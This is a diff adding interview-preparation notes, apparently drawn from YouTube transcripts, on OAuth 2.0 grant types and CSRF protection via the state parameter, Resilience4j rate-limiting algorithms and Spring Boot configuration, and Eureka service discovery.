@@ -3365,3 +3365,1125 @@ While beneficial, JWTs are not a "silver bullet" and present several challenges,
 
 - There is no "silver bullet" solution for determining the exact number of microservices or for perfectly grouping them, but **Domain-Driven Design (DDD)** offers valuable guidelines. (This point connects to prior conversation history, not from the current source, but is part of a holistic understanding).
 - JWT is a highly used and beneficial technology, especially for authentication, but it does have certain gaps and challenges. When used properly, with careful consideration of its limitations and appropriate mitigations, it significantly simplifies authentication.
+
+Here are notes from the provided YouTube transcript, organised for interview preparation, detailing the concepts explained by Shrayansh:
+
+### OAuth 2.0: Explained with API Request and Response Sample
+
+**I. Introduction to OAuth 2.0**
+
+- **OAuth** stands for **Open Authorisation**.
+- It is an **authorisation framework**.
+- Its primary function is to enable **secure third-party access to user protected data**.
+
+**II. Core Concept & User Flow Example**
+
+- **Use Case**: A user is already signed into their Gmail account (which contains their protected data, e.g., profile information).
+- The user wants to log into another website, e.g., an XYZ website.
+- Instead of creating new credentials for the XYZ website, the user sees an option to "Sign in using Gmail".
+- By choosing this option, the user **authorises the third-party (XYZ website)** to use their protected data from Gmail.
+- Gmail then provides the necessary information to the third-party, allowing the user to log in and automatically retrieve details like their username.
+
+**III. Four Important Roles/Actors in OAuth 2.0**
+There are four key actors involved in the OAuth 2.0 process:
+
+1.  **Resource Owner**:
+
+    - This is the individual who owns the protected data.
+    - In the example, **the user (Shrayansh, who has the Gmail account) is the Resource Owner**.
+    - They have all their data (name, age, date of birth, email ID, address) stored in their Gmail account.
+
+2.  **Client**:
+
+    - The application or website that **initiates the request** to access the resource owner's protected data.
+    - In the example, if the user wants to access Facebook by clicking "Sign in using Gmail", then **Facebook is the client** because it wants the user's protected data.
+    - Another example is Instagram, which wants to use the user's Gmail data to help them sign in.
+
+3.  **Authorization Server**:
+
+    - This server is responsible for **authorising the client**.
+    - In the example, there would be a **Gmail Authorization Server**.
+    - Sometimes, one service (like Gmail) might take on two roles: authorization and resource hosting, but generally, these are two different components for simplification.
+
+4.  **Resource Hosting Server**:
+    - This server **holds and hosts the resource owner's protected data**.
+    - In the example, all the user's protected data (name, date of birth, email ID) is present in Gmail, so **Gmail is the Resource Hosting Server**.
+
+**IV. Mechanisms to Obtain Access Tokens (Grant Types)**
+There are five mechanisms, or "grant types", to get a token or authorise a client:
+
+- **Authorization Code Grant** (very important and popular).
+- Refresh Token Grant (also used).
+- Implicit Grant (generally not encouraged).
+- Resource Owner Password Credential Grant.
+- Client Credential Grant.
+
+**V. Detailed Flow of Authorization Code Grant (The Most Important)**
+This flow involves the four actors: Resource Owner (user), Client (e.g., Instagram), Gmail Authorization Server, and Gmail Resource Server.
+
+1.  **Client Registration with Authorization Server**:
+
+    - **Purpose**: Before a client can offer "Sign in using Gmail", it must register with the Authorization Server.
+    - **API Call Sample**: `POST /register`
+    - **Request Parameters**:
+      - `client_name`: e.g., "Instagram".
+      - `redirect_uris`: Up to three URIs where the Authorization Server can redirect the user back after authentication/consent (callback URIs).
+    - **Response**: The Authorization Server returns two critical pieces of information:
+      - **`client_id`**: A unique identifier for the client.
+      - **`client_secret`**: A **very confidential information** known only by the client and the Authorization Server, used to authenticate the client to the Authorization Server.
+
+2.  **User Initiates Login & Client Redirects to Authorization Server**:
+
+    - **User Action**: The resource owner clicks "Sign in using Gmail" on the client (e.g., Instagram).
+    - **Client Action**: The client redirects the user's browser to the Authorization Server.
+    - **API Call Sample**: The client invokes the `GET /authorize` API.
+    - **Request Parameters (sent by client)**:
+      - **`response_type`**: Must be `code` to specify that the client expects an authorization code in the response.
+      - **`client_id`**: The ID obtained during registration.
+      - **`redirect_uri`**: (Optional) The URI where the callback should happen. If not provided, the Authorization Server uses one of the pre-defined URIs from registration. If provided, it **must match one of the registered URIs**.
+      - **`scope`**: Specifies what information the client wants to access (e.g., "email", "profile", "address"). These are space-separated values.
+      - **`state`**: A **random, unique, and difficult-to-guess value** generated by the client. Its purpose is to protect against **CSRF (Cross-Site Request Forgery) attacks**.
+
+3.  **User Authentication & Consent on Authorization Server**:
+
+    - The user arrives at the Gmail Authorization Server's page.
+    - If not already logged in, the user provides their Gmail username and password to **authenticate** themselves.
+    - The Authorization Server then shows a **consent screen** (e.g., "Instagram wants to access your email, profile, and address. Do you provide consent?").
+    - The user must **explicitly provide consent** (e.g., by clicking "Yes").
+
+4.  **Authorization Server Redirects with Authorization Code**:
+
+    - After successful authentication and consent, the Authorization Server **redirects the user's browser back to the `redirect_uri`** provided by the client (or one registered previously).
+    - **Response (sent to client via redirect URI)**: The Authorization Server includes:
+      - **`code`**: The **authorization code**.
+      - **`state`**: The **same `state` value** that the client originally sent in its `authorize` request.
+
+5.  **Protection Against CSRF Attacks using `state` Parameter**:
+
+    - **CSRF Attack Scenario**:
+      - An **attacker** somehow gets an authorization code for themselves (e.g., by calling the `authorize` API) but doesn't use it immediately.
+      - The **legitimate user** tries to log in to the legitimate client (e.g., Instagram) using Gmail.
+      - The legitimate client sends an `authorize` request and waits for an authorization code.
+      - The attacker intercepts the response or tricks the user's browser into receiving the **attacker's authorization code** instead of the legitimate one.
+      - If the client accepts this attacker's code, it will then request a token using the attacker's code.
+      - The Authorization Server will issue a **token linked to the attacker's account**, not the legitimate user's.
+      - Consequently, when the client uses this token to access protected data, it will retrieve the **attacker's data** (e.g., upload files to the attacker's Google Drive). The legitimate user would be logged into the client application using the attacker's credentials.
+    - **How `state` Prevents CSRF**:
+      - When the legitimate client initiates the `authorize` request, it sends a **unique, random `state` value** (e.g., `SJ111`).
+      - The Authorization Server includes this **exact same `state` value** in its redirect response along with the authorization code.
+      - Upon receiving the authorization code and `state` from the Authorization Server, the **client compares the received `state` value with the `state` value it originally sent**.
+      - If the `state` values **do not match** (or if `state` is missing), the client **discards the request**, as it indicates a potential CSRF attack (the response is not for the request the client sent).
+      - If the `state` values **match**, the client accepts the authorization code, confirming it's a legitimate response to its own request.
+
+6.  **Client Fetches Access Token using Authorization Code**:
+
+    - Once the client receives and validates the authorization code, it immediately uses it to request an access token from the Authorization Server.
+    - **API Call Sample**: `POST /token`
+    - **Request Parameters**:
+      - **`grant_type`**: Set to `authorization_code`.
+      - **`code`**: The authorization code received in the previous step.
+      - **`redirect_uri`**: (Optional) Same rules as before; if provided, it must match a registered URI.
+      - **`client_id`**: The client's ID.
+      - **`client_secret`**: The **confidential secret used to authenticate the client** to the Authorization Server. This ensures only the legitimate client can exchange the code for a token.
+    - **Response**: The Authorization Server provides two main tokens:
+      - **`access_token`**:
+        - A **short-lived token** (e.g., expiring in 10-15 minutes or 3600 seconds/1 hour).
+        - **`token_type`: `Bearer`**: This indicates that the client should pass this token in the `Authorization` header when accessing protected data.
+        - Can be a **JWT (JSON Web Token)** or a plain string.
+      - **`refresh_token`**: A **generally long-lived token**.
+
+7.  **Client Accesses Protected Data using Access Token**:
+
+    - The client (e.g., Instagram) now uses the **access token** to call the Gmail Resource Server (where the user's data is hosted).
+    - **Client Action**: The client sends the access token with its request for user data (e.g., "give me this data").
+    - **Resource Server Action**:
+      - The Gmail Resource Server **calls the Authorization Server to validate the access token**.
+      - The Authorization Server validates the token and returns whether it's valid or invalid.
+      - If valid, the Resource Server **provides the requested information** (e.g., user's name, age, email ID) to the client.
+      - If invalid, the request is discarded, and an error (e.g., `401 Unauthorized`) might be returned.
+    - **Result**: The client successfully signs in the user using the fetched data.
+
+8.  **Refreshing Access Token using Refresh Token**:
+    - When the **`access_token` expires**, the client can use the `refresh_token` to obtain a new `access_token`.
+    - This mechanism is a "refresh token grant".
+    - **API Call Sample**: `POST /token` (again)
+    - **Request Parameters**:
+      - **`grant_type`**: Set to `refresh_token`.
+      - **`refresh_token`**: The `refresh_token` value previously obtained.
+      - **`redirect_uri`**: (Optional).
+      - **`client_id`**:.
+      - **`client_secret`**:.
+    - **Response**: A **new `access_token`** and potentially a **new `refresh_token`** are returned.
+    - **Key Benefit**: The user does **not need to re-authenticate** (provide username/password) when using a refresh token to get a new access token.
+
+**VI. Other Grant Types**
+
+1.  **Implicit Grant**:
+
+    - **Not Recommended for use** generally; Authorization Code Grant is preferred.
+    - **Single-Step Process**: Unlike Authorization Code Grant, there's no intermediate "code" step. The client directly requests and receives the access token in one go.
+    - **API Call Sample**: `GET /authorize`
+    - **Request Parameters**:
+      - **`response_type`**: Set to `token` (client expects a token directly).
+      - `client_id`, `redirect_uri` (optional), `scope`, `state`.
+    - **Response**: The `access_token` is returned directly in the redirect URI.
+    - **No Refresh Token**: Implicit Grant typically **does not provide a refresh token** because it's a single-step process where a new token can be requested directly via `authorize` if needed.
+
+2.  **Resource Owner Password Credential Grant**:
+
+    - **Direct Username/Password**: The client directly asks the user for their username and password and sends them to the Authorization Server.
+    - **No `authorize` API**: There's no separate authentication/consent flow via the Authorization Server's UI; the client directly calls the `token` API.
+    - **API Call Sample**: `POST /token`
+    - **Request Parameters**:
+      - **`grant_type`**: Set to `password`.
+      - `username` (resource owner's), `password` (resource owner's).
+      - `client_id`, `client_secret`, `scope`.
+    - **Response**: Returns both an **`access_token` and a `refresh_token`**.
+    - **Refresh Token Usage**: Similar to Authorization Code Grant, the `refresh_token` can be used to get new access tokens **without re-providing username/password**.
+
+3.  **Client Credential Grant**:
+    - **Scenario**: Used when the **Resource Owner is also the Client**. The client is accessing its own resources or resources for which it has direct authorisation, not acting on behalf of a separate user.
+    - **API Call Sample**: `POST /token`
+    - **Request Parameters**:
+      - **`grant_type`**: Set to `client_credentials`.
+      - `client_id`, `client_secret`, `scope`.
+    - **Response**: Returns an **`access_token`**.
+    - **No Refresh Token**: Typically **no refresh token** is required here. If the access token expires, the client can simply call the `token` API again with its client ID and secret to get a new one, as it doesn't rely on user interaction.
+    - **No `authorize` call needed** as no user consent is involved.
+
+**VII. General Advice from the Source**
+
+- The API names and parameters discussed are **samples** for clarification and may not be the exact official names.
+- It is recommended to always **follow official documentation** (RFCs - Request for Comments) for precise API names and parameters for OAuth.
+
+Here are the notes from the provided YouTube transcript excerpts, organised into blocks for each source, designed for interview preparation:
+
+### Notes from the YouTube Transcript
+
+---
+
+**Source:**
+
+- A **fault-tolerant microservice** is defined as a service that continues to operate even when **downstream systems fail**.
+- Instead of crashing or causing a **cascading failure**, it should gracefully handle failures.
+- This is crucial because, in microservices, different services communicate over the network, and the **unavailability of one service can bring down the entire system**.
+- **Example of a non-fault-tolerant system**:
+  - A client calls an **Order component**, which then calls a **Product component**.
+  - The Product component responds to Order, and Order then responds to the client.
+  - If a **buggy code** makes the **Product service too slow** (e.g., each API call taking 60 seconds), the **Order service will hang** for 60 seconds while waiting for a response.
+  - A **sudden burst of requests** from the client would then cause all Order service threads to wait for 60 seconds.
+
+---
+
+**Source:**
+
+- **Cascading Failure Explained**: When all threads in the Order service are waiting, it will eventually **run out of threads** and start rejecting requests. This leads to a **cascading failure** affecting all clients and other microservices.
+- The issue in the Product service escalates as more load comes in, further deteriorating its situation and causing the failure to cascade to the Order service and potentially beyond.
+- **Importance of Fault Tolerance**: It is necessary to build microservices (like the Order component) to be fault-tolerant so that even if a dependent service (like Product) goes down or becomes slow, its failure does not cascade and cause the current service to crash.
+- **Resilience4j Framework**: This framework provides a combination of mechanisms to help develop fault-tolerant microservices.
+- **Mechanisms provided by Resilience4j**:
+  - **Rate Limiter**
+  - **Bulkhead**
+  - **Time Limiter**
+  - **Circuit Breaker**
+  - **Retry**
+- **Recommended Logical Ordering for Applying Mechanisms**: The mechanisms should generally be applied in this order: **Rate Limiter first, then Bulkhead, Time Limiter, Circuit Breaker, and finally Retry**.
+- **Reason for Logical Ordering**: For example, applying **Rate Limiter before Retry** is crucial. If Retry is applied first, it would unnecessarily waste computation by retrying traffic that would ultimately be blocked by the Rate Limiter anyway.
+
+---
+
+**Source:**
+
+- **Rate Limiter Definition**: It **controls the number of requests allowed** to a microservice within a specific time window.
+- **Purpose**: To **protect the system from sudden traffic spikes**, similar to how it would defend against a Distributed Denial of Service (DoS) attack.
+- **Common Rate Limiter Algorithms**:
+  - **Fixed Window Counter**
+  - **Sliding Log**
+  - **Sliding Window Counter** (with two flavours: Token Bucket and Leaky Bucket)
+  - **Token Bucket**
+  - **Leaky Bucket**
+- **Fixed Window Counter Algorithm**:
+  - **How it works**: It counts how many requests occur within a **fixed time window**. If the request count exceeds the predefined limit for that window, subsequent requests are rejected.
+  - **Example**: If the limit is 5 requests per a 10-second fixed window (e.g., 0-10 seconds, 10-20 seconds), the first 5 requests within that window are allowed. Any subsequent requests (e.g., the 6th request) in the same window are rejected.
+
+---
+
+**Source:**
+
+- **Disadvantage of Fixed Window Counter**:
+  - It can lead to a **sudden spike in traffic acceptance at the edges of the window**.
+  - **Example**: If 5 requests come at the very end of Window 1 (e.g., at 9 seconds) and 5 more requests come at the very beginning of Window 2 (e.g., at 11 seconds), the system effectively accepts 10 requests within a 1-second period. This might overwhelm the system, despite the overall window limit.
+- **Sliding Log Algorithm (also known as Sliding Window Log)**:
+  - **How it works**: For each accepted request, it **stores the exact timestamp**.
+  - When a new request arrives, it checks **how many requests have occurred within the defined 'x' seconds window size** (a sliding window) by looking at the stored timestamps.
+  - If the number of requests within the current sliding window reaches the limit, the new request is rejected.
+
+---
+
+**Source:**
+
+- **Sliding Log Example (continued)**:
+  - If the window size is 10 seconds and the limit is 5 requests.
+  - The system logs timestamps for accepted requests (e.g., at 2, 5, 7, 9 seconds).
+  - As time progresses, the window "slides" (e.g., from 10:00:00-10:00:10 to 10:00:01-10:00:11).
+  - Only requests with timestamps within the **current sliding window** are considered. If 5 requests are already within that current 10-second sliding window, any new incoming request will be rejected.
+
+---
+
+**Source:**
+
+- **Disadvantages of Sliding Log Algorithm**:
+  - **Memory Overhead**: It requires significant memory to **store the exact timestamp for every accepted request**. More requests mean more memory usage.
+  - **Cleanup Overhead**: There is an **extra task of cleaning up** timestamps of requests that fall outside the current sliding window as it moves. This adds computational overhead.
+- **Sliding Window Counter Algorithm (First Flavour: with Sub-windows)**:
+  - **Concept**: A **main window** (e.g., 10 seconds) is **divided into smaller, equal-sized sub-windows** (e.g., 2 seconds each).
+  - Each sub-window maintains a **count of requests** that occur within its period.
+  - To determine if a new request should be accepted or rejected, the system considers the **sum of request counts in all currently active sub-windows** within the main window.
+  - The **main window slides** over time.
+  - **Example Setup**: Main window 10 seconds, sub-windows 2 seconds (0-2s, 2-4s, ..., 8-10s), limit 5 requests.
+
+---
+
+**Source:**
+
+- **Sliding Window Counter (with Sub-windows) Example (continued)**:
+  - Each sub-window individually tracks how many requests came in its period (e.g., 0-2s sub-window had 1 request, 2-4s had 1, etc.).
+  - When a request comes (e.g., at 9 seconds), the system sums the request counts from all active sub-windows that make up the 10-second main window (e.g., 0-2, 2-4, 4-6, 6-8, 8-10). If the total count is within the limit, the request is allowed.
+  - The **main window "jumps" or slides by the size of a sub-window** (e.g., by 2 seconds).
+  - When the main window slides (e.g., from 0-10s to 2-12s), the sub-windows that are now outside the current main window (e.g., 0-2s) are no longer considered ("expired"). Only the new set of active sub-windows (e.g., 2-4, 4-6, 6-8, 8-10, 10-12) are used for calculation.
+
+---
+
+**Source:**
+
+- **Disadvantages of Sliding Window Counter (with Sub-windows)**:
+  - **Increased Complexity**: It is **more complex than fixed window logic** because it involves maintaining multiple sub-windows and their individual request counts.
+  - **Higher Memory Requirement**: It **requires more memory** to store the sub-window information and their respective counts.
+  - The main window's movement is determined by the sub-window size, causing it to jump.
+- **Sliding Window Counter Algorithm (Second Flavour: with Weighted Window)**:
+  - **Concept**: This algorithm is a **combination of the Fixed Window and Sliding Log concepts**.
+  - It uses **fixed windows** (e.g., 0-10s, 10-20s) and a **sliding window** of a similar size (e.g., 10 seconds).
+  - The sliding window can **overlap between two fixed windows**, where a percentage of its duration falls into each.
+  - A "weight" is applied to the request count from the previous fixed window based on the percentage of the sliding window that overlaps with it.
+  - Unlike the sub-window approach, it **does not maintain counts for sub-windows**; it only keeps a total request count for each fixed window.
+
+---
+
+**Source:**
+
+- **Sliding Window Counter (with Weighted Window) Example (continued)**:
+  - **Limit**: 5 requests for a particular sliding window.
+  - **Scenario 1**: If the sliding window is entirely within Fixed Window 1 (0-10s), and 5 requests arrive, all are accepted, and Fixed Window 1 records 5 total requests.
+  - **Scenario 2**: If time advances and the sliding window moves (e.g., to 1-11s), it might now be 90% in Fixed Window 1 and 10% in Fixed Window 2.
+  - To calculate the current request count for the sliding window, it sums: (requests in current fixed window) + (percentage overlap with previous fixed window \* total requests in previous fixed window).
+  - **Calculation Example**: If 90% of the sliding window is in Fixed Window 1 (which had 5 requests) and 10% in Fixed Window 2 (which currently has 0 requests), the calculation would be `0 + (0.90 * 5) = 4.5`. This is typically rounded up to 5.
+  - Since the calculated count (5) equals the limit (5), any new incoming request would be denied.
+
+---
+
+**Source:**
+
+- **Sliding Window Counter (with Weighted Window) Example (continued)**:
+  - Another scenario: Slider window moves to 2-12s, meaning it's 80% in Fixed Window 1 and 20% in Fixed Window 2.
+  - Calculation: `0 (from current window) + (0.80 * 5 (from previous window)) = 4`.
+  - Since 4 is less than the limit of 5, a new request would be accepted.
+- **Disadvantage of Sliding Window Counter (with Weighted Window)**:
+  - **Inaccurate Information**: This method can be inaccurate and potentially **entertain more requests than the set limit**.
+  - **Reason for Inaccuracy**: It assumes that requests within a fixed window are uniformly spread. However, if all requests in the previous fixed window arrived at its very end, and the current sliding window only partially overlaps, the weighted calculation (e.g., 80% of 5 requests being 4) gives a misleadingly low count. This can lead the system to accept requests even when the true concurrent rate within the sliding window is higher than the limit.
+
+---
+
+**Source:**
+
+- **Token Bucket Algorithm**:
+  - **Concept**: Imagines a "bucket" with a **limited capacity for "tokens"**.
+  - **Request Consumption**: Each incoming request consumes one token.
+  - **Rejection**: If no tokens are left in the bucket, the incoming request is denied.
+  - **Refiller**: A "refiller" mechanism **adds tokens to the bucket at regular time intervals** (e.g., 1 token every 6 seconds).
+  - **Token Overflow**: If the bucket is already at its maximum capacity and the refiller attempts to add more tokens, the excess tokens will **overflow and be rejected** (not added to the bucket).
+  - **Example**: A bucket with a capacity of 4 tokens. A refiller adds 1 token every 6 seconds.
+    - The first 4 requests consume the 4 tokens and are accepted.
+    - A 5th request comes before 6 seconds have passed (so no new tokens added) and is rejected.
+    - At the 6th second, the refiller adds 1 token. The next request can then use this token and be accepted.
+- **Disadvantage of Token Bucket**:
+  - **Burst Traffic Risk**: A **quick burst of requests is possible** if the token bucket capacity is not set properly.
+  - **Example**: If the capacity is set to a high number (e.g., 1,000 tokens) without proper computation, all 1,000 tokens could be consumed by 1,000 concurrent requests in a very short period (e.g., 1 second). This could overwhelm the system, as the rate limiter would accept all these requests. Proper computation of token capacity is crucial.
+
+---
+
+**Source:**
+
+- **Leaky Bucket Algorithm**:
+  - **Concept**: Requests are treated as if they are "leaking" out of a bucket (or queue) at a **fixed, constant rate**.
+  - **Queueing**: Incoming requests are first **queued**.
+  - **Rejection on Full Queue**: If the queue (bucket) is full, any new incoming request will **overflow and be denied**, potentially returning an HTTP 429 (Too Many Requests) status.
+  - **Acceptance Rate**: Requests are processed and accepted from the queue at a very constant, fixed rate, regardless of the incoming request rate.
+  - **Flow**: Request comes -> If queue is full, deny (HTTP 429) -> If queue has space, add request to end of queue -> System constantly accepts requests from the queue.
+- **Disadvantage of Leaky Bucket**:
+  - **Increased Latency**: Requests may have to **wait in the queue** for their turn, significantly **increasing latency**.
+  - **Bottleneck Risk**: The queue itself can become a **bottleneck** for the system.
+  - **Queue Size Management**:
+    - If the queue size is **too small**, it will deny a large number of legitimate requests.
+    - If the queue size is **too big**, it will drastically increase latency and also consume more memory.
+- **Spring Boot Implementation of Rate Limiter (using Resilience4j)**:
+  - **Dependency**: Requires adding the `resilience4j-spring-boot2` dependency to the `pom.xml`.
+  - **Controller Setup**: A controller typically invokes a method in a service (e.g., `OrderService` invoking `invokeProductAPI`).
+  - **Client Communication**: Communication between microservices (e.g., Order and Product) can be handled using client technologies like Feign Client, RestTemplate, or RestClient.
+
+---
+
+**Source:**
+
+- **Applying the Rate Limiter Annotation**: The `@RateLimiter` annotation is placed on the **method that is actually invoking the external endpoint** (e.g., the method in `OrderService` that calls `ProductComponent` via Feign client `getProductById`).
+- **Annotation Attributes**:
+  - `name`: A **unique name for the rate limiter instance** (e.g., `productRateLimiter`). This name is used for configuration.
+  - `fallbackMethod`: Specifies the **name of a fallback method** that will be executed if the rate limiter denies an incoming request. This allows for graceful handling of rejected requests.
+- **Fallback Method Signature Requirements**:
+  - The **return type of the fallback method must be the same** as the original method on which `@RateLimiter` is applied.
+  - The **parameters of the fallback method must also match** those of the original method.
+  - Additionally, the fallback method **must include a `Throwable` parameter** as its last parameter.
+  - If the signature does not match, Resilience4j may not be able to identify your custom fallback and might default to its internal fallback mechanism.
+  - Inside the fallback method, you can handle the exception (e.g., log it, throw a custom exception) according to your business logic.
+
+---
+
+**Source:**
+
+- **Default Algorithm in Resilience4j Rate Limiter**: By default, Resilience4j's rate limiter uses the **Token Bucket algorithm**.
+- **Configuration in `application.properties`**:
+  - `resilience4j.ratelimiter.instances.<rateLimiterName>.limit-for-period`: This property defines the **maximum number of tokens (or bucket capacity)** available in the bucket at any given time (e.g., `2`).
+  - `resilience4j.ratelimiter.instances.<rateLimiterName>.limit-refresh-period`: This specifies the **time interval after which the refiller adds tokens** to the bucket (e.g., `10s`). The number of tokens added is typically equal to `limit-for-period`.
+  - `resilience4j.ratelimiter.instances.<rateLimiterName>.timeout-duration`: This sets the **maximum time a request will wait for a token** to become available before it is ultimately rejected (e.g., `1s`). This prevents instant rejections if a token might soon become available.
+  - If the bucket is already full (`limit-for-period` reached), any new tokens added by the refiller will overflow and are not added to the bucket.
+- **Internal Working (AOP)**: The Resilience4j rate limiter framework largely operates using **Aspect-Oriented Programming (AOP)**.
+  - AOP allows Resilience4j to **intercept requests** before they reach the actual method annotated with `@RateLimiter`.
+  - It first applies the **rate limiting logic** (e.g., checking for available tokens using the default Token Bucket implementation).
+  - If the request is allowed by the rate limiter, it then calls `proceed()` (an AOP concept) to **invoke the actual original method** and its endpoint.
+
+---
+
+**Source:**
+
+- **Implementing a Custom Rate Limiter using AOP**:
+  - While Resilience4j provides default algorithms, you can implement your own custom rate limiting logic using AOP if you don't want to use the built-in Token Bucket or other defaults.
+  - **Steps for Custom Implementation (via AOP)**:
+    1.  **Define a custom annotation** (e.g., `@CustomRateLimiter`). This is how you mark the methods where your custom rate limiting should apply.
+    2.  **Create an Aspect class**: This class contains the "advice" (logic) and "pointcuts" that specify where the advice should be applied.
+    3.  **Implement the custom rate limiting logic**: Within the Aspect, before the actual method executes, you can add your custom algorithm's logic.
+    4.  **Call `proceed()`**: After your custom rate limiting logic determines that a request is allowed, you explicitly call `proceed()` to allow the original annotated method to execute and invoke its endpoint.
+
+---
+
+**Source:**
+
+- **Example Demonstration of Resilience4j Rate Limiter in Action**:
+  - **Configuration**: `limit-for-period=2` (max 2 tokens), `limit-refresh-period=10s` (2 new tokens every 10 seconds), `timeout-duration=1s` (wait up to 1 second for a token).
+  - **Hit 1**: Accepted (consumes 1st token).
+  - **Hit 2**: Accepted (consumes 2nd token).
+  - **Hit 3 (within 10 seconds)**: Rejected, prints "rate limit exceeded try later". This is because no tokens are left, and the 10-second refresh period hasn't passed.
+  - **After waiting for 10+ seconds**: The refiller adds 2 more tokens.
+  - **Subsequent Hit 1**: Accepted (consumes 1st new token).
+  - **Subsequent Hit 2**: Accepted (consumes 2nd new token).
+  - **Subsequent Hit 3 (within 10 seconds)**: Rejected, prints "rate limit exceeded".
+
+---
+
+**Source:**
+
+- **Rate Limiter Naming**: The `name` attribute given to the `@RateLimiter` annotation (e.g., `productRateLimiter`) is crucial. It allows for **specific configuration for different endpoints** by linking the annotation name to its properties in `application.properties` (e.g., `resilience4j.ratelimiter.instances.productRateLimiter.limit-for-period`).
+- This means you can have multiple rate limiters configured with different parameters for various components (e.g., a `productRateLimiter` and a `salesRateLimiter`).
+
+Here are the notes from the provided YouTube transcript, structured line by line for each source, designed to be comprehensive for interview preparation:
+
+### Source 1 Notes
+
+- In **microservices**, components and services are **created and deleted dynamically**.
+- The number of instances for a microservice (e.g., `order service` or `product service`) can **change based on traffic** – more instances for high traffic, fewer for low traffic.
+- **Hardcoding URLs of instances is not scalable or feasible** in production environments because instances have dynamic IP addresses and port numbers.
+- Previously, `RestTemplate`, `RestClient`, `Feign Client` examples showed hardcoded URLs, which is acceptable for testing but **not for production**.
+- **Problem with hardcoding one URL for a service with multiple instances**: If you hardcode, traffic will always go to that one specific instance, even if others are available and idle.
+- **Connectivity Issue**: If a hardcoded instance is removed or goes down, attempts to connect to it will result in connectivity issues.
+- **Challenges due to Hardcoding URLs**:
+  - **Single Point of Failure**: If the hardcoded instance goes down, the calling service (e.g., `order service`) cannot communicate with any other available instances of the target service (e.g., `product service`).
+
+### Source 2 Notes
+
+- **No Load Balancing**: Even with multiple instances of a service, hardcoding a URL means traffic is always directed to one instance, leaving others idle.
+- **Tight Coupling**: Hardcoded URLs create a tight coupling between services (e.g., `order service` and `product service`). If the `product service` needs to change its IP or port, the `order service` must be updated first, which is cumbersome.
+- **Difficulty in Testing Different Environments**: Different environments (development, QA, staging, production) often use different URLs. Hardcoding requires frequent manual changes to configuration when moving between environments.
+- **Solution: Service Discovery**: This mechanism overcomes the limitations of hardcoding URLs.
+- **Tools for Service Discovery**: Popular options include **Eureka** (from Netflix, integrated into Spring Cloud) and Console. The concepts are similar across tools.
+- **Two Core Parts of Service Discovery**:
+  - **Server**: Acts as a **"phone book"**.
+    - It stores information about all **registered client instances**.
+    - Information includes: **service name, instance ID, IP address, port number, health status**, etc..
+  - **Client**: Clients must **register themselves** with the server to have their details maintained.
+
+### Source 3 Notes
+
+- **Eureka Server as a Phone Book**: Once clients register, the Eureka server can provide all necessary details (instances, IP, port, status) for a particular registered client, even if it has multiple instances.
+- **Eureka Client Operations**:
+  - **Register itself with the server**: Clients tell the server to maintain their instance information.
+  - **Discover an instance**: Clients ask the server for details of other registered services they want to communicate with.
+- **Service Discovery Flow (Example: Order Service calling Product Service)**:
+  1.  `Order Service` (client) first **gets the list of `Product Service` instances from the `Eureka Server`**.
+  2.  `Eureka Server` (phone book) returns details of **all available (`up`) instances** of `Product Service`. If there are 10 instances, it returns all 10.
+  3.  `Order Service` then **chooses a particular instance** from the returned list.
+  4.  `Order Service` **makes the call** to the chosen instance's endpoint.
+- **Key takeaway**: `Order Service` no longer hardcodes the URL; it fetches instances from `Eureka Server`. The `Order Service` is responsible for choosing an instance, which implies it can perform load balancing.
+- **Simplistic Diagram**: The explanation is simplified; more complex aspects like **caching** are involved to avoid calling the Eureka server for every request.
+
+### Source 4 Notes
+
+- **Setting up a Eureka Server Application**:
+  1.  **Create a new Spring Boot application** (e.g., using Spring Initializr) with at least the `web` dependency.
+  2.  **Add `spring-cloud-starter-netflix-eureka-server` dependency** to `pom.xml`.
+      - **Dependency Management**: It's recommended to use **Spring Cloud's dependency management** to handle versions, ensuring compatibility between different Spring Cloud libraries (e.g., Eureka Server and Feign Client). This prevents manual version compatibility issues.
+  3.  **Enable Eureka Server**: Add the **`@EnableEurekaServer` annotation** to the main Spring Boot application class.
+      - This annotation tells Spring Boot to **create necessary beans** for Eureka Server functionality, such as the Eureka controller and dashboard. Without it, these beans won't be created.
+
+### Source 5 Notes
+
+- **Eureka Server `application.properties` Configuration**:
+
+  - `spring.application.name`: A descriptive name for the server application.
+  - `server.port`: The port number on which the Eureka server will run (e.g., **`8761`**).
+  - **Crucial for Server Setup**:
+    - `eureka.client.register-with-eureka=false`: Tells the server **not to register itself** with Eureka (as it is the server). By default, this is `true`.
+    - `eureka.client.fetch-registry=false`: Tells the server **not to discover/fetch registries** from itself. By default, this is `true`.
+  - After starting, the Eureka dashboard should be accessible at `localhost:8761`, initially showing no registered applications.
+
+- **Setting up a Eureka Client Application (e.g., Product Service)**:
+  1.  **Add `spring-cloud-starter-netflix-eureka-client` dependency** to the client's `pom.xml`.
+      - Again, use dependency management for version control.
+  2.  **Eureka Client `application.properties` Configuration**:
+      - `server.port`: Port for the client application.
+      - `spring.application.name`: The service name (e.g., `product-service`), which will be displayed on the Eureka dashboard.
+      - `eureka.client.register-with-eureka=true`: (Optional, as `true` is the **default**) Specifies that this application should register itself with the Eureka server.
+      - `eureka.client.fetch-registry=true`: (Optional, as `true` is the **default**) Specifies that this application should fetch the registry from the Eureka server.
+        - These two properties can be set to `false` based on specific client needs (e.g., only registering, not fetching, or vice-versa).
+      - **`eureka.client.service-url.defaultZone`**: **Extremely important**. This specifies the **URL of the Eureka server** (e.g., `http://localhost:8761/eureka`) where the client will talk to register and discover.
+        - `/eureka` is the **default endpoint** for the Eureka server.
+  - Once the `product-service` client starts, the Eureka dashboard (`localhost:8761`) will display "PRODUCT-SERVICE" with its address (instance ID, port, URL, status as `up`).
+  - The same setup steps (adding client dependency, configuring `application.properties` with server URL and client name) apply to other client services like `order-service`.
+
+### Source 6 (Continued) & 7 Notes
+
+- **How Order Service Invokes Product Service using Service Discovery**:
+
+  - **Old way (without Service Discovery, using `RestTemplate`)**:
+
+    - `RestTemplate` object was created, and `getForObject` was called with a **hardcoded URL** of the `product service`.
+
+  - **New way (with Service Discovery, using `RestTemplate`)**:
+
+    - Inject **`DiscoveryClient`** (`spring-cloud-client.discovery.DiscoveryClient`).
+    - Use `discoveryClient.getInstances("product-service")` to **fetch a list of `ServiceInstance` objects** for the specified service name (`product-service`). The service name must match the `spring.application.name` configured in the target service.
+    - Each `ServiceInstance` contains details like URL, port, URI, name.
+    - **Manual Load Balancing**: When using `RestTemplate` with `DiscoveryClient`, you receive a _list_ of instances. You must **manually implement the load balancing logic** to choose a specific instance from this list (e.g., `get(0)` is shown as a simplistic example, but a Round Robin or other logic is needed).
